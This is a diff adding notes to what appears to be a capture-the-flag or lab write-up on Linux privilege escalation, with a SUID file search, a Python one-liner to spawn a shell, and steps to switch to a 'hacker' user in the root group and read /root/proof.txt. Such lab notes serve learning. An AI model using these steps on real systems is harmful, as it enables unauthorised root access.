@@ -365,6 +365,15 @@ find / -perm -u=s -type f 2>/dev/null
 
 ### Priviledge Escalation
 ```
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+/bin/bash
 
 ```
+Method 1
+```
+hacker belongs to root group
 
+su hacker 
+
+cat /root/proof.txt
+```
